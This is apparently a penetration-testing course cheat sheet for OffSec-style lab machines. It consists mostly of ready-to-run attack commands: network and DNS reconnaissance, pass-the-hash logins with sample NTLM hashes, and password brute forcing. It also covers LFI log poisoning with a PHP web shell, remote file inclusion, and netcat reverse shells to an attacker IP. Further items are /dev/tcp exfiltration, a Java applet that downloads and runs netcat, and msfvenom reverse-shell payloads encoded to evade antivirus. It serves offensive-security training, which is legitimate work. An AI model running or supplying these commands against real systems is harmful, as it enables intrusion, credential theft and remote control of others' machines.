...
```sh
➜  lab-connection nc -nv 10.11.4.81 25
(UNKNOWN) [10.11.4.81] 25 (smtp) open
...
^C
➜  lab-connection nc -nv 10.11.4.81 110
(UNKNOWN) [10.11.4.81] 110 (pop3) open
...
➜  lab-connection nc -nv 10.11.4.81 143
(UNKNOWN) [10.11.4.81] 143 (imap2) open
...
connect to [10.11.4.81] from <UNKNOWN> [10.11.0.238] 59460
hi
```

```sh
# Kali
➜  lab-connection nc -nv 10.11.4.81 4444
(UNKNOWN) [10.11.4.81] 4444 (?) open
hi
```
...
```sh
# Kali
➜  lab-connection nc -nv 10.11.4.81 4446 < /usr/share/windows-binaries/wget.exe
(UNKNOWN) [10.11.4.81] 4446 (?) open
➜  lab-connection
```
...
```sh
# Kali
nc -nv 10.11.4.81 4446 -e /bin/bash
```
...
```sh
watch -n1 nc -w1 -nvz 10.11.1.125 123
...
```sh
host -t ns megacorpone.com # dns nameservers
host -t mx megacorpone.com # mailservers
```
...
```sh
host www.megacorpone.com # get ip of www.megacorpone.com
host idontexist.megacorpone.com # attempt to get ip of non existant subdomain
```
...
root@kali:~# for ip in $(cat list.txt); do host $ip.megacorpone.com | grep 'has address'; done
...
```sh
root@kali:~/Downloads# for ip in $(seq 1 254); do host 38.100.193.$ip | grep -v 'not found' | grep megacorpone.com; done
...
```sh
root@kali:~/Downloads# host -l megacorpone.com ns1.megacorpone.com
Using domain server:
...
```sh
root@kali:~/Downloads# host -l megacorpone.com ns2.megacorpone.com
Using domain server:
...
### 4.1.6 - Relevant Tools in Kali

#### 4.1.6.1 - `dnsrecon`

* `dnsrecon -d megacorpone.com`
* `dnsrecon -d megacorpone.com -t axfr`
* `dnsrecon -r 38.100.193.0/24 | grep megacorpone.com`
...
```sh
nc -unvv -w 1.5 -z 10.11.4.81 160-165
(UNKNOWN) [10.11.1.227] 165 (?) : Connection refused
(UNKNOWN) [10.11.1.227] 164 (cmip-agent) : Connection refused
(UNKNOWN) [10.11.1.227] 163 (cmip-man) : Connection refused
(UNKNOWN) [10.11.1.227] 162 (snmp-trap) : Connection refused
(UNKNOWN) [10.11.1.227] 161 (snmp) open
(UNKNOWN) [10.11.1.227] 160 (?) : Connection refused
```
...
##### Default Sweep
`nmap -sn 10.11.1.0/24` or `nmap -sP 10.11.1.0/24`

##### Output Greppable
`nmap -T4 -n -sn -oG - 10.11.1.0/24 | grep Up | cut -d' ' -f2`

##### Specific Port
`nmap -T4 -n -sn -p 80 -oG - 10.11.1.0/24`

##### Aggressive Connect Scan on Top Ports
`nmap -sT -A --top-ports=20 10.11.1.0/24 -oG -`
...
An aggressive `-A` scan includes both `-sV`, `-O`, script scanning and traceroute: `nmap -A 10.11.1.220`
...
`nmap --script=[script] 10.11.1.220`
...
`nmap -p 139,445 --open -oG smb.txt 10.11.1.0/24`
...
enum4linux -u 'guest' -p '' -a 10.11.1.22
```

#### `CrackMapExec`
Works perfectly, list shares and permissions, enum users, disks, code execute and run modules like mimikatz. Hashes work.
```sh
crackmapexec -u 'guest' -p '' --shares 10.11.11.11
crackmapexec -u 'guest' -p '' --rid-brute 4000 10.11.11.11
crackmapexec -u 'guest' -p '' --users 10.11.11.11
crackmapexec smb 10.11.1.0/24 -u Administrator -p P@ssw0rd
crackmapexec smb 10.11.1.0/24 -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -M mimikatz 10.11.1.0/24
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B -x whoami 10.11.1.31
crackmapexec -u Administrator -H E52CAC67419A9A2238F10713B629B565:64F12CDDAA88057E06A81B54E73B949B --exec-method smbexec -x whoami 10.11.1.31 # reliable pth code execution
```

#### `smbmap`
Works well for listing and downloading files, and listing shares and permissions. Hashes work. Code execution don't work.
```sh
smbmap -u '' -p '' -H 10.11.1.31 # similar to crackmapexec --shares
smbmap -u guest -p '' -H 10.11.1.31
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 10.11.1.31
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 10.11.1.31 -r # list top level dir
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 10.11.1.31 -R # list everything recursively
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 10.11.1.31 -s wwwroot -R -A '.*' # download everything recursively in the wwwroot share to /usr/share/smbmap. great when smbclient doesnt work
smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H 10.11.1.31 -x whoami # no work
```

#### `smbclient`
Access SMB shares interactively, seems to work with anonymous access. Hashes don't work.
```sh
smbclient //10.11.11.11/wwwroot
smbclient //10.11.1.223/C$ WIN20082017 -U Administrator
smbclient //10.11.1.223/C$ A433F6C2B0D8BB92D7288ECFFACFC7CD -U Administrator --pw-nt-hash # make sure to only use the NT portion of the hash
```
...
```sh
pth-winexe -U administrator%WIN20082017 //10.11.1.223 cmd # using a plaintext password
pth-winexe -U Administrator%A433F6C2B0D8BB92D7288ECFFACFC7CD //10.11.1.223 cmd # ntlm hash encrypted with https://www.browserling.com/tools/ntlm-hash
pth-winexe -U domain/user%A433F6C2B0D8BB92D7288ECFFACFC7CD //10.11.1.223 cmd # domain user
pth-winexe -U Administrator%8F49412C8D29DF02FB62879E33FBB745:A433F6C2B0D8BB92D7288ECFFACFC7CD //10.11.1.223 cmd # lm+ntlm hash encrypted with https://asecuritysite.com/encryption/lmhash
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:A433F6C2B0D8BB92D7288ECFFACFC7CD //10.11.1.223 cmd # ntlm hash + empty lm hash
# or
export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896
pth-winexe -U Administrator% //10.11.4.81 cmd
```
...
```sh
xfreerdp /u:testing /d:thinc /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /v:10.11.1.221
```

### 4.3.3 - Nmap SMB NSE Scripts
* List all smb nse scripts - `ls -la /usr/share/nmap/scripts/smb*`
* Check smb and OS using nse script - `nmap -p 139,445 --script=smb-os-discovery 10.11.1.229`
...
```sh
./dirsearch.py -u http://10.11.1.14 -e txt -t 50 # use dirsearch's default dict, which proved to be quite successful
./dirsearch.py -u http://10.11.1.14 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -t 50
```

### `nikto` Web Scanner
```sh
nikto -h 10.11.1.22
nikto -h 10.11.1.22 -Plugins outdated
```
...
Host: 10.11.1.229
Destination: http://10.11.1.229/shell.asp%3b.txt
...
#### Hardcoded Links
If a website has hardcoded links like "http://pinkdb.com" or "http://172.16.5.5", which you do not have access to, simply an entry like `[actual server ip] [hardcoded value]` (eg. `10.11.0.4 pinkydb.com`) to `/etc/hosts`
...
* `nmap -p 80 --script=all 10.11.1.10` - Scan a target using all NSE scripts. May take an hour to complete.
* `nmap -p 80 --script=*vuln* 10.11.1.10` - Scan a target using all NSE vuln scripts.
* `nmap -p 80 --script=http*vuln* 10.11.1.10` - Scan a target using all HTTP vulns NSE scripts.
* `nmap -p 21 --script=ftp-anon 10.11.1.0/24` - Scan entire network for FTP servers that allow anonymous access.
* `nmap -p 80 --script=http-vuln-cve2010-2861 10.11.1.0/24` - Scan entire network for a directory traversal vulnerabilitiy. It can even retrieve admin's password hash.
...
# 10 - File Transfers
Antivirus may be triggered by an upload, so becareful when transferring files. One of OffSec's favourite ways to avoid AV is to use legitimate administrative tools during post exploitation phase.
...
### Linux Dev TCP
```
cat file.txt > /dev/tcp/10.11.0.45/4444 # on victim linux
...
# On Victim
wget 10.11.0.45/scp -O /tmp/scp # transfer the exec binary over to Sufferance
chmod 755 /tmp/scp
...
sc config Apache binPath= "C:\Windows\TEMP\nc.exe 10.11.1.1 4444 -e cmd.exe" # or "net localgroup administrators bob /add"
...
```sh
rdesktop -u Administrator -p abc123 10.11.1.221
rdesktop -u 'thinc\testing' -p '1qwer$#@!' 10.11.1.221 # where thinc is the domain. if thinc doesn't work, try thinc.local
xfreerdp /u:testing /d:thinc /p:'1qwer$#@!' /v:10.11.1.221
xfreerdp /u:testing /d:thinc /pth:31d6cfe0d16ae931b73c59d7e0c089c0 /v:10.11.1.221 # PTH method
```
    ...
    public void init() {
        ...
        try {
            ...
            if (download.length() > 0) {
                ...
                out.close();
                in.close();
                f = Runtime.getRuntime().exec("cmd.exe /c " + expath + " 10.11.0.238 443 -e cmd.exe"); // change to Kali IP
            }
        } catch(IOException e) {
            e.printStackTrace();
        }
...
### 13.3.1 - Local File Inclusion (LFI)
...
```
10.11.0.5 - - [17/Apr/2013:06:22:00 -0400] " <?php echo shell_exec($_GET['cmd']);?>" 400 1047
```
...
```
http://10.11.4.81/addguestbook.php?name=hi&comment=&cmd=ipconfig&LANG=../../../../../../../xampp/apache/logs/access.log%00
```
...
```
http://10.11.4.81/addguestbook.php?name=hi&comment=&cmd=tftp+-i+[kali ip]+get+nc.exe&LANG=../../../../../../../xampp/apache/logs/access.log%00
```
...
```
http://10.11.4.81/addguestbook.php?name=hi&comment=&cmd=nc.exe+[kali ip]+[port]+-e+cmd.exe&LANG=../../../../../../../xampp/apache/logs/access.log%00
```
...
#### `fimap`
```sh
fimap -s -u 'http://10.11.1.24/classes/phpmailer/class.cs_phpmailer.php?classes_dir='
```

### 13.3.2 - Remote File Inclusion (RFI)
...
```
http://10.11.4.81/addguestbook.php?name=hi&comment=&LANG=http://[kali ip]/evil.txt%00
```
...
Alternatively, to avoid constantly changing the php file, host this instead, and visit `http://10.11.4.81/addguestbook.php?name=hi&comment=&LANG=http://[kali ip]/evil.txt%00&cmd=whoami`. Change `cmd` to the command you want to execute:
```php
<?php echo shell_exec($_GET['cmd']);?>
```
...
```
10.11.4.81/backdoor.php?cmd=ipconfig
```

#### MSSQL Xp_Cmdshell and Dumping
```sh
nmap -T4 -n -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=abc,ms-sql-xp-cmdshell.cmd='whoami' 10.11.1.31 # command execution
nmap -T4 -n -p 1433 --script ms-sql-tables --script-args mssql.username=sa,mssql.password=abc 10.11.1.31 # dump tables information
nmap -T4 -n -p 1433 --script ms-sql-query --script-args mssql.username=sa,mssql.password=abc,mssql.database=bankdb,ms-sql-query.query="select * from tblCustomers;" 10.11.1.31 # sql query
```
...
```sh
sqlmap -u http://10.11.1.35 --crawl=1 # crawls link with depth 1 and automatically find GET SQLi
...
sqlmap -u http://10.11.1.35/login.php --data='username=john&password=smith' # POST using data
...
### 14.1.6 - Password Profiling with `cewl` and `john`
```sh
cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt # scrape and generate password list from words found
...
medusa -h 10.11.1.219 -u admin -P password-file.txt -M http -m DIR:/admin -T 20 # http brute force password
medusa -h 10.11.1.219 -p admin -U user-file.txt -M http -m DIR:/admin -T 20 # http brute force username
```

#### 14.2.1.2 - `ncrack`
```sh
# Modules available: FTP, SSH, Telnet, HTTP(S), POP3(S), SMB, RDP, VNC, SIP, Redis, PostgreSQL, MySQL
ncrack -vv --user offsec -P password-file.txt rdp://10.11.1.35 # rdp brute force password
ncrack -vv --password offsec -U user-file.txt rdp://10.11.1.35 # rdp brute force username
```
...
hydra -vV -l root -P password-file.txt 10.11.1.219 ftp # ftp brute force password
hydra -vV -p root -L user-file.txt 11.11.1.219 ftp # ftp brute force username
hydra -vV -l root -P password-file.txt 10.11.1.219 ssh # ssh brute force password
hydra -vV -l root -P fasttrack.txt -M hosts -o bruteforce ssh # ssh brute force password of multiple hosts and output to file
hydra -vV -f -P password-file.txt 10.11.1.219 snmp # snmp brute force password, stop when found
hydra -vV -f -C userpass.txt 10.11.1.219 ftp # ftp brute force login, using [user]:[pass] file, stop when found
...
hydra -vV -f -l admin -P /usr/share/dirb/wordlists/small.txt -t 50 -o login-brute-force 10.11.1.24 http-form-post "/index.php:target=auth&mode=login&user_login=^USER^&password=^PASS^:The username or password you entered is invalid"
...
If you (10.11.0.45) compromised a host with two NICs (10.11.0.251, 10.1.1.251) on session 1, simply use `route add` and now you can target that range.
```
...
creds
creds -a 10.11.1.1 -p 22 -u root -P toor
loot
```
...
### Executable Payloads
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.45 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.45 LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shell.exe -x /usr/share/windows-binaries/plink.exe -k # embed with existing program, and allow it to continue functionality with -k (spawn new thread)
...
```sh
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -o shell.exe # 30/46
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -o shell.exe # 34/46
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.5 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell.exe # 27/46
